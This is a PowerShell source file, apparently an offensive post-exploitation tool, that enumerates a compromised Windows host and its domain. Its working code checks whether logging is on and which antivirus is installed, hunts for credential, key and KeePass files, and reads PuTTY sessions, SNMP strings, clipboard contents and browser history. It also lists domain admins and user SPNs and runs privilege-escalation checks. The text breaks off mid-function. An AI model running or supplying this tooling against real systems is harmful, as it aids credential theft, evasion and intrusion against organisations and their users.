



function Invoke-HostEnum {

    [CmdletBinding()]
    Param(
        [Switch]$All,
        [Switch]$Local,
        [Switch]$Domain,
        [Switch]$Quick,
        [Switch]$Privesc,
        [Switch]$HTMLReport
    )
    
    
    $ErrorActionPreference = "SilentlyContinue"

    
    If ($All) {$Local = $True; $Domain = $True; $Privesc = $True}
    
    
    
    $Time = (Get-Date).ToUniversalTime()
    [string]$StartTime = $Time|Get-Date -uformat  %Y%m%d_%H%M%S
    
    
    If ($HTMLReport) {
        [string]$Hostname = $ENV:COMPUTERNAME
        [string]$FileName = $StartTime + '_' + $Hostname + '.html'
        $HTMLReportFile = (Join-Path $PWD $FileName)
        
        
        $HTMLReportHeader = @"
<style>
TABLE {border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}
TH {border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color: 
TD {border-width: 1px;padding: 3px;border-style: solid;border-color: black;font-family:courier;}
TR:Nth-Child(Even) {Background-Color: 
.odd  { background-color:
.even { background-color:
</style>
<style>
.aLine {
    border-top:1px solid 
    height:1px;
    margin:16px 0;
    }
</style>
<title>System Report</title>
"@

    
        Try {
            ConvertTo-HTML -Title "System Report" -Head $HTMLReportHeader `
                -Body "<H1>System Enumeration Report for $($Env:ComputerName) - $($Env:UserName)</H1>`n<div class='aLine'></div>" `
                | Out-File $HTMLReportFile -ErrorAction Stop
            }
        Catch {
            "`n[-] Error writing enumeration output to disk! Check your permissions on $PWD.`n$($Error[0])`n"; Return
        }
    }
    
    
    "[+] Invoke-HostEnum"
    "[+] STARTTIME:`t$StartTime"
    "[+] PID:`t$PID`n"

    
    $IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
    
    If ($IsSystem) {
        "`n[*] Warning: Enumeration is running as SYSTEM and some enumeration techniques (Domain and User-context specific) may fail to yield desired results!`n"
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Note: Enumeration performed as 'SYSTEM' and report may contain incomplete results!</H2>" -as list | Out-File -Append $HTMLReportFile
        }
    }
    
    
    If ($Quick) {
        Write-Verbose "Performing quick enumeration..."
        "`n[+] Host Summary`n"
        $Results = Get-Sysinfo
        $Results | Format-List
        
        "`n[+] Running Processes`n"
        $Results = Get-ProcessInfo
        $Results | Format-Table ID, Name, Owner, Path -auto -wrap
        
        "`n[+] Installed AV Product`n"
        $Results = Get-AVInfo
        $Results | Format-List

        "`n[+] Potential AV Processes`n"
        $Results = Get-AVProcesses
        $Results | Format-Table -Auto
        
        "`n[+] Installed Software:`n"
        $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
        {
            $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        }
        $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
        $Results | Format-Table -Auto -Wrap
        
        "`n[+] System Drives:`n"
        $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
        $Results | Format-Table -auto
        
        "`n[+] Active TCP Connections:`n"
        $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
        $Results | Format-Table -auto
        
        "`n[+] Firewall Status:`n"
        $Results = Get-FirewallStatus
        $Results | Format-Table -auto
        
        "`n[+] Local Users:`n"
        $Results = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'" | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description | Sort-Object SID -Descending
        $Results | Format-Table -auto -wrap
    
        "`n[+] Local Administrators:`n"
        $Results = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } |
            Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
        $Results | Format-Table -auto -wrap
        
        
        "`n[+] Local Groups:`n"
        $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
        $Results | Format-Table -auto -wrap

        "`n[+] Group Membership for ($($env:username))`n"
        $Results = Get-GroupMembership | Sort-Object SID
        $Results | Format-Table -Auto
        
    }
    
    
    If ($Local) {

        
        "`n[+] Host Summary`n"
        $Results = Get-Sysinfo
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Host Summary</H2>" -as list | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Installed Software:`n"
        $Results  = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        if ((Get-WmiObject Win32_OperatingSystem).OSArchitecture -eq "64-bit")
        {
            $Results += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, InstallDate, DisplayVersion, Publisher, InstallLocation
        }
        
        $Results = $Results | Where-Object {$_.DisplayName} | Sort-Object DisplayName
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Software</H2>" | Out-File -Append $HTMLReportFile
        }
            
        
        "`n[+] Installed Patches:`n"
        $Results = Get-WmiObject -class Win32_quickfixengineering | Select-Object HotFixID,Description,InstalledBy,InstalledOn | Sort-Object InstalledOn -Descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Patches</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Running Processes`n"
        $Results = Get-ProcessInfo
        $Results | Format-Table ID, Name, Owner, Path, CommandLine -auto 
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Property ID, Name, Owner, MainWindowTitle, Path, CommandLine -PreContent "<H2>Process Information</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Installed Services:`n"
        $Results = Get-WmiObject win32_service | Select-Object Name, DisplayName, State, PathName
        $Results | Format-Table  -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed Services</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Environment Variables:`n"
        $Results = Get-Childitem -path env:* | Select-Object Name, Value | Sort-Object name
        $Results |Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Environment Variables</H2>"| Out-File -Append $HTMLReportFile
        }   
    
        
        "`n[+] BIOS Information:`n"
        $Results = Get-WmiObject -Class win32_bios |Select-Object SMBIOSBIOSVersion, Manufacturer, Name, SerialNumber, Version
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>BIOS Information</H2>" -as List| Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Computer Information:`n"
        $Results = Get-WmiObject -class Win32_ComputerSystem | Select-Object Domain, Manufacturer, Model, Name, PrimaryOwnerName, TotalPhysicalMemory, @{Label="Role";Expression={($_.Roles) -join ","}}
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Physical Computer Information</H2>" -as List | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] System Drives:`n"
        $Results = Get-PSDrive -psprovider filesystem | Select-Object Name, Root, Used, Free, Description, CurrentLocation
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>System Drives</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Mapped Network Drives:`n"
        $Results = Get-WmiObject -Class Win32_MappedLogicalDisk | Select-Object Name, Caption, VolumeName, FreeSpace, ProviderName, FileSystem
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Mapped Network Drives Drives</H2>" | Out-File -Append $HTMLReportFile
        }
            
        
        
        
        "`n[+] Network Adapters:`n"
        $Results = Get-WmiObject -class Win32_NetworkAdapterConfiguration | 
            Select-Object Description,@{Label="IPAddress";Expression={($_.IPAddress) -join ", "}},@{Label="IPSubnet";Expression={($_.IPSubnet) -join ", "}},@{Label="DefaultGateway";Expression={($_.DefaultIPGateway) -join ", "}},MACaddress,DHCPServer,DNSHostname | Sort-Object IPAddress -descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Adapters</H2>" | Out-File -Append $HTMLReportFile
        }

        
        "`n[+] DNS Cache:`n"
        $Results = Get-WmiObject -query "Select * from MSFT_DNSClientCache" -Namespace "root\standardcimv2" | Select-Object Entry, Name, Data
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>DNS Cache</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Network Shares:`n"
        $Results = Get-WmiObject -class Win32_Share | Select-Object  Name, Path, Description, Caption, Status
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Shares</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Active TCP Connections:`n"
        $Results = Get-ActiveTCPConnections | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, IPVersion
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active TCP Connections</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] TCP/UDP Listeners:`n"
        $Results = Get-ActiveListeners |Where-Object {$_.ListeningPort -LT 50000}| Select-Object Protocol, LocalAddress, ListeningPort, IPVersion
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>TCP/UDP Listeners</H2>" | Out-File -Append $HTMLReportFile
        }
        
        "`n[+] Firewall Status:`n"
        $Results = Get-FirewallStatus
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Firewall Status</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Routing Table:`n"
        $Results = Get-WmiObject -class "Win32_IP4RouteTable" -namespace "root\CIMV2" |Select-Object Destination, Mask, Nexthop, InterfaceIndex, Metric1, Protocol, Type
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Routing Table</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Net Sessions:`n"
        $Results = Get-WmiObject win32_networkconnection | Select-Object LocalName, RemoteName, RemotePath, Name, Status, ConnectionState, Persistent, UserName, Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Network Sessions</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Proxy Configuration:`n"
        $regkey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
        $Results = New-Object -TypeName PSObject -Property @{
                        Enabled = If ((Get-ItemProperty -Path $regkey).proxyEnable -eq 1) {"True"} else {"False"}
                        ProxyServer  = (Get-ItemProperty -Path $regkey).proxyServer
                        AutoConfigURL  = (Get-ItemProperty -Path $regkey).AutoConfigUrl
                        }
                        
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Proxy Configuration</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        
        
        
        "`n[+] Local users:`n"
        $Results = Get-WmiObject -Class Win32_UserAccount -Filter "Domain='$($env:ComputerName)'" | Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description | Sort-Object SID -Descending
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Users</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Local Administrators:`n"
        $Results = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } |
            Select-Object Name, Domain, SID, AccountType, PasswordExpires, Disabled, Lockout, Status, Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Administrators</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Local Groups:`n"
        $Results = Get-WmiObject -Class Win32_Group -Filter "Domain='$($env:ComputerName)'" | Select-Object Name,SID,Description
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Local Groups</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        
        
        "`n[+] Installed AV Product`n"
        $Results = Get-AVInfo
        $Results | Format-List
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Installed AV Product</H2>" -as list | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Potential AV Processes`n"
        $Results = Get-AVProcesses
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Potential AV Processes</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        If ($Results.displayName -like "*mcafee*") {
            $Results = Get-McafeeLogs
            $Results |Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recent McAfee AV Logs</H2>" -as list | Out-File -Append $HTMLReportFile
            }
        }
        
        
        "`n[+] Registry Keys`n"
        $Results = Get-InterestingRegistryKeys
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Registry Keys</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" -as list | Out-File -Append $HTMLReportFile
        }   
    
        
        "`n[+] Interesting Files:`n"
        $Results = Get-InterestingFiles
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Interesting Files</H2>`n<table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
        }
        
        
        
        
        "`n[+] Group Membership - $($Env:UserName)`n"
        $Results = Get-GroupMembership | Sort-Object SID
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Group Membership - $($env:username)</H2>"| Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Browser History`n"
        $Results = Get-BrowserInformation | Where-Object{$_.Data -NotMatch "google" -And $_.Data -NotMatch "microsoft" -And $_.Data -NotMatch "chrome" -And $_.Data -NotMatch "youtube" }
        $Results | Format-Table Browser, DataType, User, Data -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -Property Browser, DataType, User, Data, Name -PreContent "<H2>Browser History</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n[+] Active Internet Explorer URLs - $($Env:UserName)`n"
        $Results = Get-ActiveIEURLS
        $Results | Format-Table -auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Active Internet Explorer URLs - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        "`n`n[+] Recycle Bin Contents - $($Env:UserName)`n"
        $Results = Get-RecycleBin
        $Results | Format-Table -Auto
        If ($HTMLReport) {
            $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Recycle Bin Contents - $($Env:UserName)</H2>" | Out-File -Append $HTMLReportFile
        }
        
        
        Add-Type -Assembly PresentationCore
        "`n[+] Clipboard Contents - $($Env:UserName):`n"
        $Results = ''
        $Results = ([Windows.Clipboard]::GetText()) -join "`r`n" | Out-String
        $Results
        If ($HTMLReport) {
            ConvertTo-HTML -Fragment -PreContent "<H2>Clipboard Contents - $($Env:UserName)</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>"| Out-File -Append $HTMLReportFile
        }
        
        
        
        
        
        
        
        
        
            
    }

    
    If ($Domain) {
        If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H1>Domain Report - $($env:USERDOMAIN)</H1><div class='aLine'></div>" | Out-File -Append $HTMLReportFile
            }
        
        If ((gwmi win32_computersystem).partofdomain){
            Write-Verbose "Enumerating Windows Domain..."
            "`n[+] Domain Mode`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainMode
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Domain Mode: $Results</H2>" | Out-File -Append $HTMLReportFile
            }
            
            
            "`n[+] Domain Administrators`n"
            $Results = Get-DomainAdmins
            $Results
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Domain Administrators</H2><table><tr><td><PRE>$Results</PRE></td></tr></table>" | Out-File -Append $HTMLReportFile
            }
            
            
            "`n[+] Domain Account Policy`n"
            $Results = Get-DomainAccountPolicy
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Account Policy</H2>" -as List | Out-File -Append $HTMLReportFile
            }
                            
            
            "`n[+] Domain Controllers:`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).DomainControllers | Select-Object  Name,OSVersion,Domain,Forest,SiteName,IpAddress
            $Results | Format-Table -Auto   
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Controllers</H2>" | Out-File -Append $HTMLReportFile
            }
            
            
            "`n[+] Domain Trusts:`n"
            $Results = ([System.Directoryservices.Activedirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
            $Results | Format-List
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Trusts</H2>" -as List | Out-File -Append $HTMLReportFile
            }
            
            
            "`n[+] Domain Users:`n"
            $Results = Get-WmiObject -Class Win32_UserAccount | Select-Object Name,Caption,SID,Fullname,Disabled,Lockout,Description |Sort-Object SID
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Users</H2>" | Out-File -Append $HTMLReportFile
            }
            
            
            "`n[+] Domain Groups:`n"
            $Results = Get-WmiObject -Class Win32_Group | Select-Object Name,SID,Description | Sort-Object SID
            $Results | Format-Table -Auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>Domain Groups</H2>" | Out-File -Append $HTMLReportFile
            }
            
            
                
            
            "`n[+] User Account SPNs`n"
            $Results = Get-UserSPNS -UniqueAccounts
            $Results | Format-Table -auto
            If ($HTMLReport) {
                $Results | ConvertTo-HTML -Fragment -PreContent "<H2>User Account SPNs</H2>" | Out-File -Append $HTMLReportFile
            }
        }
        Else {
            "`n[-] Host is not a member of a domain. Skipping domain checks...`n"
            If ($HTMLReport) {
                ConvertTo-HTML -Fragment -PreContent "<H2>Host is not a member of a domain. Domain checks skipped.</H2>" | Out-File -Append $HTMLReportFile
            }
        }
    }

    
    If ($Privesc) {
        If ($HTMLReport) {
            Invoke-AllChecks -HTMLReport
        }
        Else {
            Invoke-AllChecks
        }
    }
    
    $Duration = New-Timespan -start $Time -end ((Get-Date).ToUniversalTime())
    
    
    
    "`n"
    If ($HTMLReport) {
        "[+] FILE:`t$HTMLReportFile"
        "[+] FILESIZE:`t$((Get-Item $HTMLReportFile).length) Bytes"
    }
    "[+] DURATION:`t$Duration"
    "[+] Invoke-HostEnum complete!"
}


function Get-SysInfo {

    $os_info = gwmi Win32_OperatingSystem
    $uptime = [datetime]::ParseExact($os_info.LastBootUpTime.SubString(0,14), "yyyyMMddHHmmss", $null)
    $uptime = (Get-Date).Subtract($uptime)
    $uptime = ("{0} Days, {1} Hours, {2} Minutes, {3} Seconds" -f ($uptime.Days, $uptime.Hours, $uptime.Minutes, $uptime.Seconds))
    $date = Get-Date
    
    $SysInfoHash = @{            
        HOSTNAME                = $ENV:COMPUTERNAME                         
        IPADDRESSES             = (@([System.Net.Dns]::GetHostAddresses($ENV:HOSTNAME)) | %{$_.IPAddressToString}) -join ", "        
        OS                      = $os_info.caption + ' ' + $os_info.CSDVersion     
        ARCHITECTURE            = $os_info.OSArchitecture   
        "DATE(UTC)"             = $date.ToUniversalTime()| Get-Date -uformat  "%Y%m%d%H%M%S"
        "DATE(LOCAL)"           = $date | Get-Date -uformat  "%Y%m%d%H%M%S%Z"
        INSTALLDATE             = $os_info.InstallDate
        UPTIME                  = $uptime           
        USERNAME                = $ENV:USERNAME           
        DOMAIN                  = (GWMI Win32_ComputerSystem).domain            
        LOGONSERVER             = $ENV:LOGONSERVER          
        PSVERSION               = $PSVersionTable.PSVersion.ToString()
        PSSCRIPTBLOCKLOGGING    = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -EA 0).EnableScriptBlockLogging -eq 1){"Enabled"} Else {"Disabled"}
        PSTRANSCRIPTION         = If((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).EnableTranscripting -eq 1){"Enabled"} Else {"Disabled"}
        PSTRANSCRIPTIONDIR      = (Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -EA 0).OutputDirectory
    }      
                
    
    New-Object -TypeName PSobject -Property $SysInfoHash | Select-Object Hostname, OS, Architecture, "Date(UTC)", "Date(Local)", InstallDate, UpTime, IPAddresses, Domain, Username, LogonServer, PSVersion, PSScriptBlockLogging, PSTranscription, PSTranscriptionDir
}

    
function Get-ProcessInfo() {
  
    
    Write-Verbose "Enumerating running processes..."
    $owners = @{}
    $commandline = @{}

    gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
    gwmi win32_process |% {$commandline[$_.handle] = $_.commandline}

    $procs = Get-Process | Sort-Object -property ID
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "Owner" -Value $owners[$_.id.tostring()] -force}
    $procs | ForEach-Object {$_|Add-Member -MemberType NoteProperty -Name "CommandLine" -Value $commandline[$_.id.tostring()] -force}

    Return $procs
}
    
function Get-GroupMembership {

    Write-Verbose "Enumerating current user local group membership..."
    
    $UserIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $CurrentUserSids = $UserIdentity.Groups | Select-Object -expand value
    $Groups = ForEach ($sid in $CurrentUserSids) {
        $SIDObj = New-Object System.Security.Principal.SecurityIdentifier("$sid")
        $GroupObj = New-Object -TypeName PSObject -Property @{
                    SID = $sid
                    GroupName = $SIDObj.Translate([System.Security.Principal.NTAccount])
        }
        $GroupObj
    }
    $Groups
}

function Get-ActiveTCPConnections {

    Write-Verbose "Enumerating active network connections..."
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
    $Connections = $IPProperties.GetActiveTcpConnections()            
    foreach($Connection in $Connections) {            
        if($Connection.LocalEndPoint.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }            
        New-Object -TypeName PSobject -Property @{           
            "LocalAddress"  = $Connection.LocalEndPoint.Address            
            "LocalPort"     = $Connection.LocalEndPoint.Port            
            "RemoteAddress" = $Connection.RemoteEndPoint.Address            
            "RemotePort"    = $Connection.RemoteEndPoint.Port            
            "State"         = $Connection.State            
            "IPVersion"     = $IPType            
        }
    }
}
    
function Get-ActiveListeners {

    Write-Verbose "Enumerating active TCP/UDP listeners..."     
    $IPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()         
    $TcpListeners = $IPProperties.GetActiveTCPListeners()
    $UdpListeners = $IPProperties.GetActiveUDPListeners()
            
    ForEach($Connection in $TcpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "TCP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
    }
    ForEach($Connection in $UdpListeners) {            
        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }                 
        New-Object -TypeName PSobject -Property @{          
            "Protocol"      = "UDP"
            "LocalAddress"  = $Connection.Address            
            "ListeningPort" = $Connection.Port            
            "IPVersion"     = $IPType
        }
    }
}

function Get-FirewallStatus {

    $regkey = "HKLM:\System\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy"
    New-Object -TypeName PSobject -Property @{
        Standard    = If ((Get-ItemProperty $regkey\StandardProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
        Domain      = If ((Get-ItemProperty $regkey\DomainProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
        Public      = If ((Get-ItemProperty $regkey\PublicProfile).EnableFirewall -eq 1){"Enabled"}Else {"Disabled"}
    }
}
    
function Get-InterestingRegistryKeys {

    Write-Verbose "Enumerating registry keys..."            
    
    
    "`n[+] Recent RUN Commands:`n"
    Get-Itemproperty "HKCU:\software\microsoft\windows\currentversion\explorer\runmru" | Out-String

    
    "`n[+] SNMP community strings:`n"
    Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" | Format-Table -auto | Out-String
    
    
    "`n[+] SNMP community strings for current user:`n"
    Get-ItemProperty "HKCU:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities"| Format-Table -auto |Out-String
    
    
    "`n[+] Putty saved sessions:`n"
    Get-ItemProperty "HKCU:\Software\SimonTatham\PuTTY\Sessions\*" |Format-Table -auto | Out-String
    
}

function Get-IndexedFiles {

param (
    [Parameter(Mandatory=$true)][string]$Pattern)  

    if($Path -eq ""){$Path = $PWD;} 

    $pattern = $pattern -replace "\*", "%"  
    $path = $path + "\%"

    $con = New-Object -ComObject ADODB.Connection
    $rs = New-Object -ComObject ADODB.Recordset

    
    
    Try {
        $con.Open("Provider=Search.CollatorDSO;Extended Properties='Application=Windows';")}
    Catch {
        "[-] Indexed file search provider not available";Break
    }
    $rs.Open("SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE System.FileName LIKE '" + $pattern + "' " , $con)

    While(-Not $rs.EOF){
        $rs.Fields.Item("System.ItemPathDisplay").Value
        $rs.MoveNext()
    }
}

function Get-InterestingFiles {

    Write-Verbose "Enumerating interesting files..."

    
    $SearchStrings = "*secret*","*creds*","*credential*","*.vmdk","*confidential*","*proprietary*","*pass*","*credentials*","web.config","KeePass.config*","*.kdbx","*.key","tnsnames.ora"
    $IndexedFiles = Foreach ($String in $SearchStrings) {Get-IndexedFiles $string}
    
    "`n[+] Indexed File Search:`n"
    "`n[+] Search Terms ($SearchStrings)`n`n"
    $IndexedFiles |Format-List |Out-String
    
    
    "`n[+] All 'FileSystem' Drives - Top Level Listing:`n"
    Get-PSdrive -psprovider filesystem |ForEach-Object {gci $_.Root} |Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] System Drive - Program Files:`n"
    GCI "$ENV:ProgramFiles\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] System Drive - Program Files (x86):`n"
    GCI "$ENV:ProgramFiles (x86)\" | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] Current User Desktop:`n"
    GCI $ENV:USERPROFILE\Desktop | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] Current User Documents:`n"
    GCI $ENV:USERPROFILE\Documents | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] Current User Profile (*pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config):`n"
    GCI $ENV:USERPROFILE\ -recurse -include *pass*,*diagram*,*.pdf,*.vsd,*.doc,*docx,*.xls,*.xlsx,*.kdbx,*.key,KeePass.config | Select-Object Fullname,LastWriteTimeUTC,LastAccessTimeUTC,Length | Format-Table -auto | Out-String
    
    
    "`n[+] Contents of Hostfile:`n`n"
    (Get-Content -path "$($ENV:WINDIR)\System32\drivers\etc\hosts") -join "`r`n"
}

function Get-RecycleBin {
  
    Write-Verbose "Enumerating deleted files in Recycle Bin..."
    Try {
        $Shell = New-Object -ComObject Shell.Application
        $Recycler = $Shell.NameSpace(0xa)
        If (($Recycler.Items().Count) -gt 0) {
            $Output += $Recycler.Items() | Sort ModifyDate -Descending | Select-Object Name, Path, ModifyDate, Size, Type
        }
        Else {
            Write-Verbose "No deleted items found in Recycle Bin!`n"
        }
    }
    Catch {Write-Verbose "[-] Error getting deleted items from Recycle Bin! $($Error[0])`n"}
    
    Return $Output
}

function Get-AVInfo {

    Write-Verbose "Enumerating installed AV product..."

    $AntiVirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct  -ComputerName $env:computername

    switch ($AntiVirusProduct.productState) { 
        "262144" {$defstatus = "Up to date" ;$rtstatus = "Disabled"} 
        "262160" {$defstatus = "Out of date" ;$rtstatus = "Disabled"} 
